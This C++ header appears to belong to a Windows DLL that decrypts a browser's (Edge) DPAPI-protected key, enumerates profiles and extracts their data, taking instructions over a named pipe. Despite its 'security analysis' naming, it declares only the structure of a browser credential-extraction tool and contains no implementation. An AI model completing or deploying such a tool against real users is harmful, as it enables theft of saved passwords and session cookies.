// CryptCore.h - Main security module orchestration
#ifndef CRYPT_CORE_H
#define CRYPT_CORE_H

#include <Windows.h>
#include <string>
#include <filesystem>
#include <optional>
#include "CommunicationModule.h"

namespace fs = std::filesystem;

namespace SecurityComponents
{
    // Main orchestrator coordinating the entire extraction workflow
    class SecurityOrchestrator
    {
    public:
        explicit SecurityOrchestrator(LPCWSTR lpcwstrPipeName);

        // Executes full analysis: key decryption, profile enumeration, data extraction
        void Run();

    private:
        // Reads configuration parameters from orchestrator via pipe
        void ReadPipeParameters();

        std::optional<PipeLogger> m_logger;
        fs::path m_outputPath;
		std::vector<uint8_t> m_edgeDpapiKey;
    };
}

// Thread parameters passed to worker thread
struct ModuleThreadParams
{
    HMODULE hModule_dll;
    LPVOID lpPipeNamePointerFromOrchestrator;
};

// Main worker thread executing security analysis
DWORD WINAPI SecurityModuleWorker(LPVOID lpParam);

#endif // CRYPT_CORE_H